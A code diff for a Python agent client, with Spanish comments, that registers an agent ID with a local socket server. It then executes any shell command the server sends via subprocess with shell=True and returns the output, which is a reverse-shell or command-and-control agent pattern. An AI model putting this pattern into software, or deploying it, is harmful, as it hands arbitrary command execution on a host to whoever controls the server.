@@ -91,26 +91,34 @@ def get_private_key():
     # Función para conectar el agente al servidor de sockets
 def connect_to_server():
     server_host = '127.0.0.1'
-    server_port = 5001  # Puerto del servidor de sockets
+    server_port = 5001  
+
+    agent_id = get_agent_id()  # Obtener el ID antes de conectarse
+    if agent_id is None:
+        print("Error: No se encontró el ID del agente. Regístrate primero.")
+        return  
+
     try:
         agent_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         agent_socket.connect((server_host, server_port))
-        print("Conexión establecida con el servidor de sockets.")
-        
+        print(f"Agente {agent_id} conectado al servidor.")
+
+        # Enviar el agent_id al servidor al conectar
+        agent_socket.send(str(agent_id).encode('utf-8'))
+
         while True:
             command = agent_socket.recv(1024).decode('utf-8')
+            print(command)
             if command.lower() == "exit":
                 break
-
             if command:
-                # Ejecutar el comando y devolver la salida
                 result = subprocess.run(command, shell=True, capture_output=True, text=True)
                 output = result.stdout if result.stdout else result.stderr
                 agent_socket.send(output.encode('utf-8'))
-        
         agent_socket.close()
     except Exception as e:
         print(f"Error al conectar al servidor: {e}")
+
 
 # Función principal del cliente
 def main():
